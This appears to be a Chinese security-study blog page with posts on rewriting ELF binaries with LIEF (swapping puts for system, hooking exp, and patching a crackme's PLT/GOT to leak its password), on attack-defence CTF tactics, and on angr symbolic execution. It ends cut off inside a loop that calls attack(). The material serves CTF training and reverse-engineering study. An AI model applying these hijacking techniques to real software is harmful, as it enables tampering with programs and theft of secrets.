<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8" />
  
  <title>Another&#39;s blog</title>
  <meta name="author" content="another" />

  

  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

  
  <meta property="og:site_name" content="Another&#39;s blog" />

  
  

  
    <meta property="og:image" content="" />
  

  
  <link href="/css/images/favicon.ico" rel="icon" />
  

  <link rel="alternate" href="/atom.xml" title="Another&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  


  <!-- baidu webmaster push -->
  <script src='//push.zhanzhang.baidu.com/push.js'></script>

</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">Another&#39;s blog</a></h1>
  <h2><a href="/"></a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper">
  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.136Z"><a href="/2018/10/21/线下赛/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/线下赛/">线下赛</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="LIEF"><a href="#LIEF" class="headerlink" title="LIEF"></a>LIEF</h1><h2 id="通过交换导入导出符号"><a href="#通过交换导入导出符号" class="headerlink" title="通过交换导入导出符号"></a>通过交换导入导出符号</h2><p>首先看第一个测试程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"/bin/sh"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们的目标是让他调用 puts 变成调用 system</p>
<h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><p>修改 libc 中的相关符号，然后使用 LD_LIBRARY_PATH 加载我们修改后的库。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">hashme = lief.parse(<span class="string">"hashme"</span>)</span><br><span class="line"></span><br><span class="line">libc = lief.parse(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># get puts, system symbol</span></span><br><span class="line"></span><br><span class="line">puts_sym = filter(<span class="keyword">lambda</span> e: e.name == <span class="string">"puts"</span>, libc.dynamic_symbols)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">system_sym = filter(<span class="keyword">lambda</span> e: e.name == <span class="string">"system"</span>, libc.dynamic_symbols)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># swap them</span></span><br><span class="line"></span><br><span class="line">puts_sym.name = <span class="string">"system"</span></span><br><span class="line"></span><br><span class="line">system_sym.name = <span class="string">"puts"</span></span><br><span class="line"></span><br><span class="line">libc.write(<span class="string">"libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">print(<span class="string">"done"</span>)</span><br></pre></td></tr></table></figure>
<h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><p>直接修改目标文件的导入符号，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">hashme = lief.parse(<span class="string">"hashme"</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># get puts, system symbol</span></span><br><span class="line"></span><br><span class="line">puts_sym = filter(<span class="keyword">lambda</span> e: e.name == <span class="string">"puts"</span>, hashme.imported_symbols)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># set puts to system</span></span><br><span class="line"></span><br><span class="line">puts_sym.name = <span class="string">"system"</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">hashme.write(<span class="string">"hashme.patch"</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"done"</span>)</span><br></pre></td></tr></table></figure>
<p>直接增加代码进行patch<br>修改库函数<br>测试程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Usage: %s &lt;a&gt; \n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> a = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"exp(%d) = %f\n"</span>, a, <span class="built_in">exp</span>(a));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>目标是hook exp 函数，直接增加一个 segments ,<br> 然后劫持函数指针到这里。首先编译一个 lib 用来提供用于 hook 的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span><br></pre></td></tr></table></figure>
<p>hook.c 的内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">hook</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后看脚本内容，很清晰。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">libm = lief.parse(<span class="string">"/lib/x86_64-linux-gnu/libm-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">hook = lief.parse(<span class="string">"hook"</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">segment_added = libm.add(hook.segments[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">print(<span class="string">"Hook inserted at VA: 0x&#123;:06x&#125;"</span>.format(segment_added.virtual_address))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">exp_symbol = libm.get_symbol(<span class="string">"exp"</span>)</span><br><span class="line"></span><br><span class="line">hook_symbol = hook.get_symbol(<span class="string">"hook"</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">exp_symbol.value = segment_added.virtual_address + hook_symbol.value</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">libm.write(<span class="string">"libm.so.6"</span>)</span><br></pre></td></tr></table></figure>
<p>通过地址进行钩子</p>
<p>libm.patch_address </p>
<p>通过 got/plt 表 直接劫持程序</p>
<p>测试程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Damn_YoU_Got_The_Flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> password[] = <span class="string">"\x18\x3d\x31\x32\x03\x05\x33\x09\x03\x1b\x33\x28\x03\x08\x34\x39\x03\x1a\x30\x3d\x3b"</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span>* input)</span></span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span>* input)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(password) - <span class="number">1</span>; ++i) &#123;</span><br><span class="line"></span><br><span class="line">    password[i] ^= <span class="number">0x5c</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(password, input, <span class="keyword">sizeof</span>(password) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (check(argv[<span class="number">1</span>]) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You got it !!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wrong"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hook.c 内容，hook <span class="built_in">memcpy</span>, 打印内容。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"arch/x86_64/syscall.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stdout 1</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_memcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* lhs, <span class="keyword">const</span> <span class="keyword">void</span>* rhs, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> msg[] = <span class="string">"Hook add\n"</span>;</span><br><span class="line"></span><br><span class="line">  _write(<span class="built_in">stdout</span>, msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">  _write(<span class="built_in">stdout</span>, (<span class="keyword">const</span> <span class="keyword">char</span>*)lhs, n);</span><br><span class="line"></span><br><span class="line">  _write(<span class="built_in">stdout</span>, <span class="string">"\n"</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  _write(<span class="built_in">stdout</span>, (<span class="keyword">const</span> <span class="keyword">char</span>*)rhs, n);</span><br><span class="line"></span><br><span class="line">  _write(<span class="built_in">stdout</span>, <span class="string">"\n"</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>hook 脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">crackme = lief.parse(<span class="string">"crackme.bin"</span>)</span><br><span class="line"></span><br><span class="line">hook = lief.parse(<span class="string">"hook"</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">segment_added = crackme.add(hook.segments[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">my_memcmp = hook.get_symbol(<span class="string">"my_memcmp"</span>)</span><br><span class="line"></span><br><span class="line">my_memcmp_addr = segment_added.virtual_address + my_memcmp.value</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">crackme.patch_pltgot(<span class="string">'memcmp'</span>, my_memcmp_addr)</span><br><span class="line"></span><br><span class="line">crackme.write(<span class="string">"crackme.hooked"</span>)</span><br></pre></td></tr></table></figure>
<h1 id="线下攻防经验小结"><a href="#线下攻防经验小结" class="headerlink" title="线下攻防经验小结"></a>线下攻防经验小结</h1><pre><code>首先正常比赛会提供提交 flag 的接口，
接口地址类似 http://172.16.4.1/Common/submitAnswer。一般我们需要根据主办方给出的文档要求通过接口提交 flag。在比赛中要求接口地址使用 Post 方式提交，
提交时带两个参数，一个是 Answer，
其值为获取到的 flag 字符串，而另一个则是 token
 ，其值为各个队伍的队伍 Token。
然后比赛时主办方也会给每个参赛队伍提供一台用于分析网络流量的虚拟机 ，选手需要访问地址下载流量文件进行分析。
</code></pre><h2 id="关注-Gamebox-状态"><a href="#关注-Gamebox-状态" class="headerlink" title="关注 Gamebox 状态"></a>关注 Gamebox 状态</h2><pre><code>比赛中可以查看己方和敌方 GameBox 状态。
时刻关注可以尽早获取比赛信息，根据信息做出调整。
对于己方 GameBox，有存在如下原因造成 GameBox 被 down 掉：
程序 patch 失误导致服务不可用。
在程序 patch 完之后要进入下一轮关注 GameBox 状态，
如果 patch 失误导致不可用，需要及时挽救。
对手不正当攻击导致 GameBox 不可用。如果发现，需要及时补救。
主办方加强程序 check。这种情况主办方会对所有队员进行通知公告。在 GameBox 状态墙上的状态会显示该题的各队 GameBox 大面积不可用。
</code></pre><h2 id="敌人gamebox"><a href="#敌人gamebox" class="headerlink" title="敌人gamebox"></a>敌人gamebox</h2><pre><code>对于敌方 GameBox。我们可以获取以下信息。
根据攻击流观测哪些队伍的 GameBox 没有防御成功。
针对这些队伍可以更多地实现攻击
有队伍拿出一血时。可以根据各队 GameBox     状态推断出一血队伍是否已经写出利用脚本。
写出利用脚本后可以观测己方是否做好了防御。
分清区段与端口
比赛过程中会主办方会安排好合理的网段分布。
</code></pre><h2 id="比赛的一些策略"><a href="#比赛的一些策略" class="headerlink" title="比赛的一些策略"></a>比赛的一些策略</h2><pre><code>在比赛过程中，不宜死耗在一道题上，
由于一血的优势性，在比赛过程中更应该全面了解赛题难度，
先从 简单题 开始进行分析，步步为营。
比赛过程中，两极会严重分化。
应该着力打击和自己实力相当和比自己队伍更强的队伍，
尤其是分数相差无几的情况下，更要严防严守。
比赛中 NPC 会不定时发出攻击流量。从攻击流量中可以得到 payload。
一定要把 NPC 往死里打。
在开赛初可以将所有的管理密码都设置为同一个密码，
这样方便队员登录管理。在初期将所有文件备份下来供队内分享。
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.134Z"><a href="/2018/10/21/漏洞挖掘/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/漏洞挖掘/">漏洞挖掘</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="人工代码审计"><a href="#人工代码审计" class="headerlink" title="人工代码审计"></a>人工代码审计</h2><h2 id="内存漏洞：高危函数"><a href="#内存漏洞：高危函数" class="headerlink" title="内存漏洞：高危函数"></a>内存漏洞：高危函数</h2><h2 id="自动化代码审计"><a href="#自动化代码审计" class="headerlink" title="自动化代码审计"></a>自动化代码审计</h2><pre><code>污点分析
fuzzing
符号执行
静态审计
攻击表面分析：监控文件执行记录重要行为 网络数据分析
</code></pre><h1 id="angr例子"><a href="#angr例子" class="headerlink" title="angr例子"></a>angr例子</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr, archinfo</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">basic_symbolic_execution</span><span class="params">()</span>:</span></span><br><span class="line">  proj = angr.Project(<span class="string">'./mem'</span>)<span class="comment">#加载程序</span></span><br><span class="line">  <span class="keyword">print</span> hex(proj.entry)</span><br><span class="line">  state = proj.factory.entry_state() <span class="comment">#打开到入口点</span></span><br><span class="line">  br = state.solver.BVS(<span class="string">"br"</span>, <span class="number">32</span>)<span class="comment">#添加随机串32位</span></span><br><span class="line">  <span class="comment">#state.solver.add(br &gt; 100)#约束</span></span><br><span class="line">  state.solver.add(br &lt; <span class="number">102</span>)</span><br><span class="line">  state.solver.add(br.SGT(<span class="number">100</span>))</span><br><span class="line">  state.memory.store(<span class="number">0x601030</span>, br)<span class="comment">#更改内存为随机串</span></span><br><span class="line">  simgr = proj.factory.simulation_manager(state)<span class="comment">#管理（固定的）</span></span><br><span class="line">  simgr.run()<span class="comment">#暴力全执行</span></span><br><span class="line">  <span class="keyword">print</span> simgr</span><br><span class="line">  <span class="keyword">for</span> value <span class="keyword">in</span> simgr.stashes.values():</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> value:</span><br><span class="line">      <span class="keyword">print</span> hex(s.solver.eval(br))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  basic_symbolic_execution()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">state.inspect.b(<span class="string">'mem_write'</span>, when=angr.BP_AFTER, action=debug_func)内存断点在写后并且执行debug函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">simgr.explore(find=<span class="keyword">lambda</span> s: <span class="string">"Welcome"</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))约束</span><br><span class="line">  <span class="keyword">print</span> simgr</span><br><span class="line">  <span class="keyword">return</span> simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)输出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  k = state.posix.files[<span class="number">0</span>].read_from(<span class="number">1</span>)<span class="comment">#写入stdin一个并满足约束</span></span><br><span class="line">  state.solver.add(k.SGE(<span class="number">0x30</span>))</span><br><span class="line">  state.solver.add(k.SLE(<span class="number">0x39</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> Project, SimProcedure</span><br><span class="line">project = Project(<span class="string">'./fauxware'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BugFree</span><span class="params">(SimProcedure)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, argc, argv)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># this assumes we have symbols for the binary</span></span><br><span class="line">project.hook_symbol(<span class="string">'main'</span>, BugFree())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 钩子</span></span><br><span class="line">simgr = project.factory.simulation_manager()</span><br><span class="line">project._sim_procedures </span><br><span class="line">simgr.run() </span><br><span class="line"><span class="keyword">print</span> simgr.deadended[<span class="number">0</span>].posix.dumps(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.133Z"><a href="/2018/10/21/文件读写内存实例/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/文件读写内存实例/">文件读写内存实例</a></h1>
  

    </header>
    <div class="entry">
      
        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># level 3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">attack()</span><br><span class="line">change_host()</span><br><span class="line"><span 